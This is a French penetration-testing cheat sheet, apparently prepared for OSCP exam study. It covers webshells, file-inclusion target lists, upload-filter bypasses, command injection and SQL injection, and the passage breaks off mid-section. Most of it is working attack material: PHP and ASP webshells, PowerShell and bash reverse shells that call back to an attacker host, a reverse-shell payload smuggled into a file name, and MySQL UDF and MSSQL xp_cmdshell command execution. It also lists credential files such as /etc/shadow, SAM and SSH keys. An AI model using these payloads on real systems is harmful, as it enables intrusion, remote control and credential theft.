<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]</code></p>
**Paramètres et repères :**
`multi-os-php-reverse-shell.php`  

#### Webshell PHP

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">Extrait PHP : exemple technique pour «Webshell PHP» (ce n'est pas une commande de terminal).</p>

```php
<?php system($_GET['cmd']); ?>

```

#### Webshell ASP

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Webshell ASP» (ne pas exécuter comme une commande).</p>

```text
<% eval request('cmd') %>

```

#### Charge utile Netcat sans Meterpreter

Vérifier les ports et les services de la cible autorisée.

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>

```

#### Fichiers Linux courants

Examiner les permissions et la configuration de Linux.

<p class="oscp-command-note">Chemins Linux à vérifier dans un test LFI : ce sont des fichiers, pas des commandes.</p>

```bash
# Fichiers couramment recherchés
/etc/passwd                       # Contains user accounts
/etc/shadow                       # Stores hashed user passwords
/var/www/html/wp-config.php       # WordPress configuration
/proc/self/environ                # Environment variables (can contain session tokens)

# Autres chemins possibles
/etc/passwd
/etc/shadow
/etc/hosts
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/etc/apache2/sites-available/000-default.conf
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/proc/self/environ
../wp-content/wp-config.php
/www/apache/conf/httpd.conf

```

#### Fichiers Windows courants

Ces chemins sont des **valeurs de test pour une inclusion de fichiers (LFI)**, pas des commandes à saisir. Les permissions peuvent empêcher leur lecture.

<p class="oscp-command-note">Chemins Windows à examiner dans un test LFI (liste de fichiers, pas de commandes).</p>

```text
# Fichiers couramment recherchés
C:\Windows\System32\drivers\etc\hosts          # Fichier hosts
C:\xampp\apache\logs\access.log                # Journaux d'accès Apache
C:\xampp\php\php.ini                           # Configuration PHP
C:\Users\Administrator\NTUser.dat              # Données du profil utilisateur
C:\Windows\System32\config\SAM                 # Base SAM des comptes locaux
C:\Windows\System32\winevt\Logs\Security.evtx  # Journaux d'événements de sécurité

# Autres chemins possibles
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml

```

### Flux PHP (PHP Wrappers)

Examiner les entrées et les réponses de l'application web.

**Paramètres et repères :**
`php://filter`  

<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Flux PHP (PHP Wrappers)».</p>

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"

# Décoder la réponse encodée en Base64
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d

```

**Paramètres et repères :**
`php://data`  

```bash
curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"

# Encoder la charge utile PHP en Base64.
echo -n '<?php echo system($_GET["cmd"]); ?>' | base64

```

### Injection de commandes système (OS Command Injection)

Examiner les entrées et les réponses de l'application web.

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

```

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell

```

<p class="oscp-command-note">Envoyer une requête HTTP POST.</p>

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive

```

## Téléversement de fichiers (File Upload)

Examiner les entrées et les réponses de l'application web.

**Paramètres et repères :**
`.php` · `.aspx`  

### Extensions interdites (liste de blocage)

**Paramètres et repères :**
`ffuf` · `BurpSuite`  

<p class="oscp-command-note">Exemples d'extensions doubles</p>

```text
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg

```

### Extensions autorisées (liste d’autorisation)

<p class="oscp-command-note">PHP : filtrer les extensions par suffixe ; ce contrôle ne prouve pas que le contenu est une image.</p>

```php
# Ceci ne vérifie que si la liste blanche est là dans le fichier de téléchargement et non si elle se termine avec elle.
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('/\.(?:jpe?g|png|gif)$/i', $fileName)) {
    echo "Only images are allowed";
    die();
}

```

### Contournement des filtres

```text
# Pour PHP
.pHP, .phps, .php7, .php4, .php5, .php3, .xxx

# Pour ASP(X)
.aspx, .asp, .ashx, .asmx

```

**Paramètres et repères :**
`.htaccess`  

```text
AddType application/x-httpd-php .dork

```

**Paramètres et repères :**
`.dork`  

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
# Nous pouvons maintenant télécharger des fichiers [file].dork.
echo "AddType application/x-httpd-php .dork" > .htaccess

```

**Paramètres et repères :**
`shell.php.jpg` · `shell.php.jpeg`  

```bash
# Cela vérifie si elle se termine avec elle si double extension ne fonctionnera pas.
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }

```

<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>shell.php%00.jpg</code></p>

```text
# Par exemple shell.php%00.jpg fonctionne avec les serveurs PHP avec la version 5.X ou une version antérieure, car il provoque la fin du nom du serveur web PHP après le « & #160; %00 & #160; », et le stocke sous la forme de « & #160; shell.php & #160; ».
%20
%0a
%00
%0d0a
/
.\
.
…
:

```

<p class="oscp-command-note">Bash : générer des variantes de caractères et extensions pour tester un filtre de fichiers.</p>

```bash
# Script pour toutes les permutations
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

```

<p class="oscp-command-note">Extrait PHP : exemple technique pour «Contournement des filtres» (ce n'est pas une commande de terminal).</p>

```php
# Code de la charge utile
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
// Autre possibilité
GIF8
<?
system($_GET['cmd']); //or you can insert your complete shell code
?>

```

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
# Sur Linux : créer un fichier d'essai et examiner son type déclaré.
echo "GIF8" > text.jpg
file text.jpg
```

**Exemple de réponse de l'outil file :**

```text
text.jpg: GIF image data
```

**Code PHP côté serveur :**

```php
// Le type MIME détecté ne suffit pas à confirmer la sécurité du fichier.
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)

### Exécution de fichiers téléversés

```bash
http://[TARGET_IP]/uploads/shell.php
# Autre possibilité
http://[TARGET_IP]/uploads/shell.php?cmd=whoami

```

### Insérer du code dans les images

**Paramètres et repères :**
`exiftool`  

<p class="oscp-command-note">Afficher les métadonnées d&#x27;un fichier.</p>

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

mv lo.jpg lo.php.jpg

```

### Insérer du code dans les noms de fichiers

```text
file$(whoami).jpg

```

**Paramètres et repères :**
`whoami.jpg`  

<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>file.jpg||whoami</code></p>

<p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>

```text
# Créez la commande encodée Base64.
echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64

# Télécharger n'importe quelle image normale, et lui donner le nom: cat.jpg.
cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’

```

### Tester un téléversement multipart

Transmettre un fichier de test inoffensif pour vérifier les restrictions de type, taille et extension.

<p class="oscp-command-note">Tester un téléversement multipart.</p>

```bash
curl -i -F 'file=@<FICHIER_TEST>.txt;type=text/plain' 'https://<HOTE_CIBLE>/upload'
```

## Injection SQL (SQLi)

Examiner les connexions, la configuration et les requêtes de la base de données.

#### Client MySQL sous Linux

Examiner les connexions, la configuration et les requêtes de la base de données.

##### Connexion initiale

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -u <username> -p -h <host>

# Ensuite, indiquez le mot de passe quand vous l'invitez.

```

##### Requêtes courantes

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Requêtes courantes».</p>

```sql
SELECT VERSION();

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Requêtes courantes ».</p>

```sql
SHOW DATABASES;

```

```sql
USE <database_name>;

```

##### Énumération des tables et colonnes

<p class="oscp-command-note">Instruction SQL dans la rubrique « Enumerating Tables and Columns ».</p>

```sql
SHOW TABLES;

```

```sql
SHOW COLUMNS FROM <table_name>;

```

##### Énumération des utilisateurs et privilèges

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des utilisateurs et privilèges».</p>

```sql
SELECT User, Host FROM mysql.user;

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Énumération des utilisateurs and Privileges ».</p>

```sql
SHOW GRANTS FOR '<username>'@'<host>';

```

##### Extraction de données

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Extraction de données».</p>

```sql
SELECT * FROM <table_name> LIMIT <number_of_rows>;

```

##### Exécution de commandes via les fonctions définies par l’utilisateur (UDF)

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"

```

<p class="oscp-command-note">Définir un objet ou une configuration SQL.</p>

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';

```

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Exécution de commandes via les fonctions définies par l’utilisateur (UDF)».</p>

```sql
SELECT sys_exec('id');

```

##### Shell inversé (Reverse Shell)

<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>

```bash
nc -lvnp 4444

```

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Shell inversé (Reverse Shell)».</p>

```sql
SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');

```

##### Obtenir une bibliothèque .so pour une UDF

**Paramètres et repères :**
`.so` · `.SO` · `.c` · `lib_mysqludf_sys.so`  

```text
// lib_mysqludf_sys.c

#include <my_global.h>
#include <my_sys.h>
#include <mysql.h>
#include <stdio.h>
#include <stdlib.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sys_exec_deinit(UDF_INIT *initid);
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

// Fonction d'initialisation de l'UDF
my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() requires exactly one string argument");
        return 1;
    }
    return 0;
}

// Fonction de nettoyage de l'UDF
void sys_exec_deinit(UDF_INIT *initid) {
    // Aucune opération à effectuer
}

// Fonction d'exécution
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    const char *command = args->args[0];
    return system(command);
}

```

**Paramètres et repères :**
`.so` · `mysql-server-dev`  

<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>

```bash
sudo apt install mysql-server-dev libmysqlclient-dev

# Compiler le code en bibliothèque partagée .so : le fichier obtenu se nomme lib_mysqludf_sys.so.
gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc

# -fPIC : produire du code indépendant de l'adresse, nécessaire aux bibliothèques partagées.
# -shared : produire une bibliothèque partagée.
# -I/usr/include/mysql : inclure les en-têtes de développement MySQL. 

```

**Paramètres et repères :**
`.so`  

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -u root -p -h <host> -e "USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE('/path/to/your/udf/lib_mysqludf_sys.so')); 
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"

```

**Paramètres et repères :**
`.so`  

<p class="oscp-command-note">Définir un objet ou une configuration SQL.</p>

```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

```

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Obtenir une bibliothèque .so pour une UDF».</p>

```sql
SELECT sys_exec('id');

```

**Paramètres et repères :**
`.SO` · `.so` · `lib_mysqludf_sys.so`  

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
# Assurez-vous que le fichier .so a les permissions et le chemin appropriés à charger correctement par MySQL.
mysql -u root -p -h <host> -e "USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE('/path/to/existing/lib_mysqludf_sys.so')); 
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"

```

#### Client MSSQL avec mssqlclient sous Windows

Examiner les connexions, la configuration et les requêtes de la base de données.

##### Connexion initiale

<p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>

```bash
# Conseil : vous pouvez également spécifier un domaine en utilisant <domain>/<username>:<password>@<host>.
impacket-mssqlclient <username>:<password>@<host> -windows-auth

```

##### Requêtes courantes

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Requêtes courantes».</p>

```sql
SELECT @@version;

```

```sql
SELECT name FROM sys.databases;

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Requêtes courantes ».</p>

```sql
USE <database_name>;

```

##### Énumération des tables et colonnes

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des tables et colonnes».</p>

```sql
# Astuce : remplacer <schema> par le nom actuel du schéma (communément dbo).
SELECT table_name FROM <schema>.information_schema.tables;

```

```sql
SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';

```

##### Énumération des utilisateurs et privilèges

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des utilisateurs et privilèges».</p>

```sql
SELECT * FROM <schema>.dbo.sysusers;

```

```sql
SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM <schema>.sys.database_principals WHERE name = '<username>');

```

##### Extraction de données

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Extraction de données».</p>

```sql
SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;

```

##### Exécution de commandes

<p class="oscp-command-note">Instruction SQL dans la rubrique « Exécution de commandes ».</p>

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

```

```sql
EXEC xp_cmdshell 'whoami';

```

**Paramètres et repères :**
`xp_cmdshell`  

<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>

```bash
# Setup the listener
nc -lvnp 4444

# Démarrez votre serveur HTTP
python3 -m http.server 80

# Ensuite, utilisez la commande shell inverse suivante sur le serveur SQL (système Windows):
# Pour télécharger une charge utile
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/shell.ps1'')"';

# Autre charge utile basée sur Netcat
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/reverse.ps1'')"

# Pour obtenir un shell inverse direct
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"';

```

#### Conseils

**Paramètres et repères :**
`xp_cmdshell`  

### Injection SQL

Examiner les connexions, la configuration et les requêtes de la base de données.

#### Fonctions SQL courantes

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Exemple de sql pour «Fonctions SQL courantes».</p>

```sql
LIMIT <row offset>, <number of rows>  -- Display rows based on offset and number
COUNT(*)                             -- Display number of rows
RAND()                               -- Generate random number between 0 and 1
FLOOR(RAND()*<number>)              -- Print out number part of random decimal number
SELECT (SELECT DATABASE());         -- Double query (nested) using DATABASE() as an example
GROUP BY <column name>              -- Summarize rows based on column name
CONCAT(<string1>, <string2>, ...)    -- Concatenate strings such as tables, column names
LENGTH(<string>)                     -- Calculate the number of characters for a given string
SUBSTR(<string>, <offset>, <length>) -- Print string character(s) by providing offset and length
ASCII(<character>)                   -- Decimal representation of the character
SLEEP(<number of seconds>)           -- Go to sleep for <number of seconds>
IF(<condition>, <true action>, <false action>) -- Conditional if statement
LIKE "<string>%"                     -- Checks if provided string is present
OUTFILE "<url to file>"              -- Dump output of select statement into a file
LOAD_FILE("<url to file>")          -- Dump the content of a file

```

```sql
SELECT TOP <number> * FROM <table>   -- Equivalent of LIMIT for MSSQL
COUNT(*) AS Total                     -- Display number of rows
NEWID()                               -- Generate random unique identifier
CAST(<expression> AS <data_type>)    -- Cast expression to a specific data type
SELECT DB_NAME()                      -- Get the current database name
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'  -- Get column names

```

#### Charges utiles fondées sur les erreurs (Error-Based)

```bash
<input>' OR 1=1 -- //

```

```bash
<input>' OR 1=1 in (SELECT @@version) -- //

```

```bash
<input>' OR 1=1 in (SELECT * FROM <table>) -- //

# Exemple
<input>' OR 1=1 in (SELECT * FROM users) -- //

```

```bash
<input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //

# Exemple
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

```

#### Charges utiles fondées sur UNION (UNION-Based)

**Paramètres et repères :**
`SELECT`  

```bash
# MySQL & MSSQL
<input>' ORDER BY <number> -- -

```

**Paramètres et repères :**
`wfuzz`  

<p class="oscp-command-note">Instruction SQL dans la rubrique « UNION-Based Payloads ».</p>

```sql
-- MySQL
wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

-- MSSQL
wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

```

<p class="oscp-command-note">URL de référence liée à «Charges utiles fondées sur UNION (UNION-Based)» (pas une commande de terminal).</p>

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -

```

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -

```

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -

```

```bash
<input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -

# Exemples
%' UNION SELECT database(), user(), @@version, null, null -- -
# or
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -

```

```bash
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -

# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -

```

```bash
# MySQL & MSSQL
http://website.com/index.php?id=1 ORDER BY <number> -- -

```

```bash
# MySQL & MSSQL
http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> INTO OUTFILE "<file_path>" -- +

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> EXEC xp_cmdshell 'echo <data> > <filename>'

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -

```

```bash
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(<column_name>), 4, 5 FROM <table_name>; -- -

# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>, ','), 4, 5 FROM <table_name>; -- -

```

**Paramètres et repères :**
`AND`  

```bash
# MySQL & MSSQL
http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -

```

##### Vérification de la vulnérabilité

<p class="oscp-command-note">Instruction SQL dans la rubrique « Vérification de la vulnérabilité ».</p>

```sql
http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+

```

```sql
http://<host>/vulnerable-page?param=<input>' AND 1=1 --+

http://<host>/vulnerable-page?param=<input>' AND '1'='1 --+

http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+

```

##### Extraire les informations de la base

**Paramètres et repères :**
`SUBSTRING`  

<p class="oscp-command-note">URL de référence liée à «Extraire les informations de la base» (pas une commande de terminal).</p>

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+

```

**Paramètres et repères :**
`SUBSTRING`  

<p class="oscp-command-note">Instruction SQL dans la rubrique « Extracting Database Information ».</p>

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+

```

##### Extraire les noms des tables et colonnes

<p class="oscp-command-note">URL de référence liée à «Extraire les noms des tables et colonnes» (pas une commande de terminal).</p>

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+

```

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 5 --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID('users')) > 5 --+

```

##### Extraire les données

**Paramètres et repères :**
`SUBSTRING`  

<p class="oscp-command-note">URL de référence liée à «Extraire les données» (pas une commande de terminal).</p>

```sql
# MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --+

# MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Extracting Data ».</p>

```sql
admin' AND SUBSTRING(username,1,1)='a' --+   # MySQL
admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL

```

##### Injection aveugle booléenne (Boolean-Based)

**Paramètres et repères :**
`SUBSTRING`  

<p class="oscp-command-note">Instruction SQL dans la rubrique « Boolean-Based ».</p>

```sql
# MySQL
http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, <character_length>))='<character>' --+

# MSSQL
http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_length>))='<character>' --+

```

##### Injection aveugle temporelle (Time-Based)

<p class="oscp-command-note">Instruction SQL dans la rubrique « Time-Based ».</p>

```sql
# MySQL
admin' OR SLEEP(5);--+

# MSSQL
